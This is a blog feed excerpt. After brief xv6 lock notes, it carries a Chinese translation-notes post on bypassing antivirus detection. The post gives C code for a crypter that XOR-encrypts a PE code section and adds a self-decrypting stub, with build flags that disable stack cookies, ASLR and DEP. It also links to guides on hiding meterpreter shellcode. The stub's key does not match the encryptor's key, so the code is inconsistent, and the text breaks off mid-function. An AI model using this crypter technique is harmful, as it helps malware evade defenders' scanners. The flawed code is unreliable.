首先，我们来看一下为什么我们需要锁？故事要从应用程序想要使用多个CPU核开始。使用多个CPU核可以带来性能的提升，如果一个应用程序运行在多个CPU核上，并且执行了系统调用，那么内核需要能够处理并行的系统调用。如果系统调用并行的运行在多个CPU核上，那么它们可能会并行的访问内核中共享的数据结构。到目前为止，你们也看到了XV6有很多共享的数据结构，例如proc、ticks和我们之后会看到的buffer cache等等。当并行的访问数据结构时，例如一个核在读取数据，另一个核在写入数据，我们需要使用锁来协调对于共享数据的更新，以确保数据的一致性。所以，我们需要锁来控制并确保共享的数据是正确的。</p><p>  但是实际的情况有些令人失望，因为我们想要通过并行来获得高性能，我们想要并行的在不同的CPU核上执行系统调用，但是如果这些系统调用使用了共享的数据，我们又需要使用锁，而锁又会使得这些系统调用串行执行，所以最后锁反过来又限制了性能。</p></blockquote><p>使用锁为了保证正确性，一个共享数据同时被读写时，如果没有锁，可能会出现race condition，条件竞争，进而导致程序出错。</p><h1 id="Chapter11"><a href="#Chapter11" class="headerlink" title="Chapter11"></a>Chapter11</h1><p>跳跳跳，编译原理</p><blockquote><p>  一些6.s081的博客</p><ol><li><a href="http://doraemonzzz.com/tags/6-S081/">http://doraemonzzz.com/tags/6-S081/</a></li><li><a href="https://fanxiao.tech/posts/MIT-6S081-notes/">https://fanxiao.tech/posts/MIT-6S081-notes/</a></li><li><a href="https://www.cnblogs.com/weijunji/tag/XV6/">https://www.cnblogs.com/weijunji/tag/XV6/</a></li><li><a href="http://xv6.dgs.zone/labs/use_git/git1.html">http://xv6.dgs.zone/labs/use_git/git1.html</a></li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;  6.s081看的是文档（比较快些），没看视频，：&lt;a href=&quot;https://github.com/Ghostasky/MIT6.S081&quot;&gt;https://github.com/Ghostasky/MIT6.S0</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>BypassAVDynamics[译]</title>
    <link href="https://ghostasky.github.io/2022/07/02/2022-6-29-BypassAVDynamics/"/>
    <id>https://ghostasky.github.io/2022/07/02/2022-6-29-BypassAVDynamics/</id>
    <published>2022-07-01T16:00:00.000Z</published>
    <updated>2022-07-12T06:30:58.168Z</updated>
    
    <content type="html"><![CDATA[<p>本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西</p><p>好久之前的文章了，vt应该查杀挺多的，没测试</p><p>need read：</p><blockquote><p>  <a href="https://blog.sevagas.com/?PE-injection-explained">PE注入</a></p><p>  这个应该写过，win32那里…</p></blockquote><p>[toc]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>绕过AV的两大步骤：</p><ul><li>恶意代码的隐藏，通常使用加密完成</li><li>对解密存根进行编码，使其不会被检测为病毒，也不会被病毒绕过沙箱</li></ul><p>本文主要是第二种，欺骗绕过沙箱。</p><h1 id="免杀原理"><a href="#免杀原理" class="headerlink" title="免杀原理"></a>免杀原理</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>静态分析基于黑名单的方法，当AV分析师得到一个恶意样本，会提取一个签名，或者说特征码，特征码是基于特殊的代码和数据。特征码通常是使用可执行文件的第一个执行字节来构造的。</p><p>AV拥有包含数百万个签名的数据库，并将扫描后的代码与该数据库进行匹配比较。</p><p>第一代AV使用上述方法，现在仍在使用，同时结合了启发式与动态分析。</p><p>YARA这款工具可以用于创建规则来分类和识别恶意软件。这些规则被上传到AV和逆向工具中。YARA 可以在 <a href="https://www.77169.net/go?url=http://plusvic.github.io/yara/">http://plusvic.github.io/yara/</a>找到。</p><p>基于这种的分析方法不能够检测新的恶意软件。所以想要绕过基于特征码的分析，可以构建一个新的代码或者做一些小的修改，</p><h2 id="静态启发式分析"><a href="#静态启发式分析" class="headerlink" title="静态启发式分析"></a>静态启发式分析</h2><p>在这种情况下，AV 将检查代码中已知存在于恶意软件中的模式。 有很多可能的规则，这取决于供应商。 这些规则通常没有描述（我想避免它们太容易被绕过）所以并不总是容易理解为什么 AV 认为软件是恶意的。 启发式分析的主要资产是它可以用来检测新的不在签名数据库中的恶意软件。 主要缺点是它会产生误报。</p><p>一个例子:函数<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN">CallNextHookEx</a>一般被用户态的键盘记录器使用。一些杀软认为这个函数的用法是一个威胁，如果这个函数的名字在可执行文件中被检测到，将发出一个关于这个软件启发式的警告。</p><p>一个例子：一段代码打开“explorer.exe”进程，尝试写一些代码到其虚拟内存空间，这也被考虑为恶意的行为。</p><p>最容易的绕过启发式分析的方法是，确保所有的恶意代码是隐藏的。对于这个，编写解密的代码是最常用的方法。如果在解密之前，没有触发警告，如果这个解密Stub在解密完没有产生一些一般被认为恶意的行为，那么这个恶意软件不会被检测出来。</p><p><a href="https://blog.sevagas.com/?Code-segment-encryption">https://blog.sevagas.com/?Code-segment-encryption</a></p><p><a href="https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable">https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable</a></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>如今大部分AV都是用动态的方法，当一个可执行文件被扫描，他将会在虚拟的环境中运行一小段时间。将此与签名验证和启发式分析相结合，可以检测未知恶意软件，即使是那些依赖加密的恶意软件。实际上，代码是在 AV 沙箱中自行解密的； 然后，对“新代码”的分析可能会引发一些可疑行为。如果使用加密&#x2F;解密stub来隐藏恶意软件，倘若他们跳过解密阶段，大部分的AV会检测到它。</p><p>也就意味着，绕过动态分析依赖两个方面：</p><ul><li>具有不可检测的自解密机制（如启发式机制）</li><li>阻止AV执行解密stub</li></ul><h2 id="杀软的局限性"><a href="#杀软的局限性" class="headerlink" title="杀软的局限性"></a>杀软的局限性</h2><p>三个主要的局限性：</p><ul><li>扫描必须快</li><li>环境是模拟的，因此不知道机器和恶意软件环境的特殊性</li><li>仿真&#x2F;沙盒系统有一些可以被恶意软件检测出来的差异性</li></ul><h1 id="代码段加密"><a href="#代码段加密" class="headerlink" title="代码段加密"></a>代码段加密</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>  <a href="https://blog.sevagas.com/?Code-segment-encryption">https://blog.sevagas.com/?Code-segment-encryption</a></p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>PE的经典构成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">======================</span><br><span class="line">PE Headers</span><br><span class="line">======================</span><br><span class="line">.textbss segment</span><br><span class="line">======================</span><br><span class="line">.text segment</span><br><span class="line">======================</span><br><span class="line">.rdata segment</span><br><span class="line">======================</span><br><span class="line">.data segment</span><br><span class="line">======================</span><br><span class="line">.rsrc segment</span><br><span class="line">======================</span><br></pre></td></tr></table></figure><ul><li><p>.textbss：为空，用于在虚拟内存中为未初始化的全局变量预留空间</p></li><li><p>.text：可执行代码</p></li><li><p>.rdata：包含只读数据它用于全局常量（包括字符串）。eg：<code>printf(&quot;hello&quot;);</code>“hello” 中进入**.rdata**。</p></li><li><p>.data：已初始化的非常量全局变量，全局变量<code>char var[] =  &quot;var&quot;;</code>不是一个常量字符串，它是一个数组并且在 .data 中。</p></li><li><p>.rsrc：资源文件</p></li></ul><p>运行起来后（差异并不大）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">======================</span><br><span class="line">Environment variables</span><br><span class="line">======================</span><br><span class="line">Stack</span><br><span class="line">----------------------------------------</span><br><span class="line">Heap</span><br><span class="line">======================</span><br><span class="line">.textbss segment</span><br><span class="line">======================</span><br><span class="line">.text segment</span><br><span class="line">======================</span><br><span class="line">.rdata segment</span><br><span class="line">======================</span><br><span class="line">.data segment</span><br><span class="line">======================</span><br><span class="line">.rsrc segment</span><br><span class="line">======================</span><br></pre></td></tr></table></figure><p>下面：修改一个应用程序（目标），使另一个应用程序可以加密它的一个段。我们还希望目标应用程序在运行时自行解密。</p><ul><li>.code段将被加密</li><li>.stub用于解密.code段</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>dumpbin，使用这个可以查看pe的东西</p><h2 id="调整目标软件"><a href="#调整目标软件" class="headerlink" title="调整目标软件"></a>调整目标软件</h2><h3 id="创建-code段"><a href="#创建-code段" class="headerlink" title="创建.code段"></a>创建.code段</h3><p>创建新段使用：<code>#pragma section</code></p><p>创建code段</p><p>在示例中，希望将可执行代码放入.code段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Your system includes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Declare .code as a read/write/execute segment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.code&quot;</span>,execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:.code,ERW&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* .code 段开始（下面所有生成的可执行代码都将进入 .code 段）*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.code&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="创建解密stub"><a href="#创建解密stub" class="headerlink" title="创建解密stub"></a>创建解密stub</h3><p>为什么我们需要一个 .stub 段，因为我们不加密所有代码？好吧，我们需要加密器能够修补目标自解密例程，并且我们想要修补的代码将更容易在 .stub 部分中找到。本文的变体也可用于将所有段合并为一个（.code）。所以有 .stub 部分更通用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// .stub SECTION</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stub&quot;</span>, execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_BASE_ADDRESS0x15151515 <span class="comment">// 指向原始数据的dumpbin文件指针 (do not change, this will be patched by cryptor)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_SIZE0x14141414 <span class="comment">// 虚拟内存的dumpbin大小 (do not change, this will be patched by cryptor)</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Decrypt .code block encrypted by cryptor */</span></span><br><span class="line"><span class="comment">/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */</span></span><br><span class="line"><span class="comment">/* Or disable security check (GS- option) on prog compilation */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decryptCodeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> nbytes;</span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line">BYTE  key[] = &#123; <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;<span class="comment">/* 注意：如果您打算加密 .rdata 段，请避免使用字符串 */</span></span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line">ptr = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)CODE_BASE_ADDRESS;<span class="comment">/* 这将由cryptor修补*/</span></span><br><span class="line">nbytes = CODE_SIZE;<span class="comment">/* 这将由cryptor修补*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// decrypt code segment    </span></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">ptr[i]=ptr[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Program first entry function */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">decryptCodeSection();</span><br><span class="line">realmain(); <span class="comment">/* Call decrypted program entry point */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译链接选项"><a href="#编译链接选项" class="headerlink" title="编译链接选项"></a>编译链接选项</h3><p>因为目标会自我修改自己，所以我们必须避免使用安全 cookie（用于堆栈验证）。为此，我们需要删除安全检查。因此，下一个编译选项是强制性的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/GS-  -&gt; Disable functions stack verification relying on secure cookies</span><br></pre></td></tr></table></figure><p>另一个选项几乎是强制性的，静态包含运行时库。如果目标中未包含 Microsoft 运行时库，则此代码将起作用，但您将面临可移植性问题。<br>使用接下来的两个运行时库选项之一。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/MTD -&gt; <span class="keyword">for</span> debug</span><br><span class="line">/MT  -&gt; <span class="keyword">for</span> release</span><br></pre></td></tr></table></figure><p>为了避免复杂化，我们希望修复地址并删除数据执行预防。为此，我们必须使用链接器的下一个选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/DYNAMICBASE:NO</span><br><span class="line">/FIXED</span><br><span class="line">/NXCOMPAT:NO</span><br></pre></td></tr></table></figure><h2 id="构建加密器"><a href="#构建加密器" class="headerlink" title="构建加密器"></a>构建加密器</h2><h3 id="获取需要的信息"><a href="#获取需要的信息" class="headerlink" title="获取需要的信息"></a>获取需要的信息</h3><p>加密器的作用是加密目标程序的 .code 段以及修补 .stub 段，以便目标在启动时能够自解密。<br>为此，密码器将浏览上一节中生成的二进制文件，并找到 .code 和 .stub 段的地址和大小。我们需要文件偏移量（修改二进制目标）和虚拟内存地址（向目标程序指示他应该在运行时解密的段在哪里）。</p><p>首先，需要使用 CreateFileMapping 和 MapViewOfFile 将文件映射到内存中。我没有对此代码进行任何功能修改。它可以在书中或在互联网上找到。<br>完成此操作后，我们解析映射文件以获取节标题信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get information of .code and .stub segments</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getSegmentsInfo</span><span class="params">(LPVOID baseAddress, SEGMENT_INFO_PTR codeSegmentInfo, SEGMENT_INFO_PTR stubSegmentInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS peHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 optionalHeader;</span><br><span class="line"></span><br><span class="line">    dosHeader = (PIMAGE_DOS_HEADER)baseAddress;</span><br><span class="line">    <span class="keyword">if</span> (((*dosHeader).e_magic) != IMAGE_DOS_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Dos signature not matched\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Dos signature=%X\n&quot;</span>, (*dosHeader).e_magic);</span><br><span class="line"></span><br><span class="line">    peHeader = (PIMAGE_NT_HEADERS)((DWORD)baseAddress + (*dosHeader).e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (((*peHeader).Signature) != IMAGE_NT_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: PE signature not matched\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: PE signature=%X\n&quot;</span>, (*peHeader).Signature);</span><br><span class="line"></span><br><span class="line">    optionalHeader = (*peHeader).OptionalHeader;</span><br><span class="line">    <span class="keyword">if</span> ((optionalHeader.Magic) != <span class="number">0x10B</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: Optional header magic number does not match\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: OPtional header magic nb=%X\n&quot;</span>, optionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">    (*codeSegmentInfo).moduleBase = optionalHeader.ImageBase;</span><br><span class="line">    (*stubSegmentInfo).moduleBase = optionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getSegmentsInfo: # sections=%d\n&quot;</span>, (*peHeader).FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill code information with content of code segment */</span></span><br><span class="line">    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, codeSegmentInfo, <span class="string">&quot;.code&quot;</span>);</span><br><span class="line">    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, stubSegmentInfo, <span class="string">&quot;.stub&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一个函数用于获取任何部分的下一个信息：</p><ul><li>原始文件中的段偏移量</li><li>文件段大小</li><li>段的虚拟内存偏移量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Look for sectionName segment in mapped file</span></span><br><span class="line"><span class="comment"> * addrInfo will be filled with the segment information</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseSectionHeaders</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PIMAGE_SECTION_HEADER section,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD nSections,</span></span></span><br><span class="line"><span class="params"><span class="function">    SEGMENT_INFO_PTR addrInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span> *sectionName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD i;</span><br><span class="line">    <span class="comment">/* Copy pointer to initial section (so this function can be called several times) */</span></span><br><span class="line">    PIMAGE_SECTION_HEADER localSection = section;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nTraverseSectionHeaders: searching for segment in section headers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;     ====================     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tName:%s\n&quot;</span>, (*section).Name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>((*section).Name, sectionName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            (*addrInfo).fileSegmentOffset = (*section).PointerToRawData; <span class="comment">/* Location of segment in binary file*/</span></span><br><span class="line">            (*addrInfo).fileSegmentSize = (*section).SizeOfRawData;      <span class="comment">/* Size of segment */</span></span><br><span class="line">            (*addrInfo).memorySegmentOffset = (*section).VirtualAddress; <span class="comment">/* Offset of segment in memory at runtime */</span></span><br><span class="line">        &#125;</span><br><span class="line">        section = section + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密目标段"><a href="#加密目标段" class="headerlink" title="加密目标段"></a>加密目标段</h2><p>现在我们有了二进制文件中 .code 段的大小和位置，我们可以打开文件并加密想要的字节。<br>该代码并未真正优化，但对于调试目的非常实用。在这个函数中，我们：</p><ul><li>打开二进制目标文件</li><li>寻找 .code 段</li><li>在缓冲区中加载 .code 段</li><li>加密缓冲区</li><li>写入加密缓冲区代替明文 .code 段</li><li>关闭文件并离开</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Encrypt .code segment bytes in the given file </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cipherBytes</span><span class="params">(<span class="keyword">char</span>* fileName, SEGMENT_INFO_PTR addrInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD fileOffset;</span><br><span class="line">DWORD nbytes;</span><br><span class="line"> </span><br><span class="line">FILE* fptr;</span><br><span class="line">BYTE *buffer;</span><br><span class="line">DWORD nItems;</span><br><span class="line">DWORD i;</span><br><span class="line">BYTE  key[] = <span class="string">&quot;ab345izz&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">fileOffset = addrInfo-&gt;fileSegmentOffset;</span><br><span class="line">nbytes = addrInfo-&gt;fileSegmentSize;</span><br><span class="line"><span class="comment">/* Allocate memory in buffer that will store content of segment */</span></span><br><span class="line">buffer = (BYTE*)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line"><span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: malloc error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Open binary file */</span></span><br><span class="line">fptr = fopen(fileName,<span class="string">&quot;r+b&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: fopen error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Seek .code section using calculated offset and copy content into buffer*/</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fread(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Trouble reading nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Encrypt buffer */</span></span><br><span class="line">    <span class="keyword">for</span>( i = 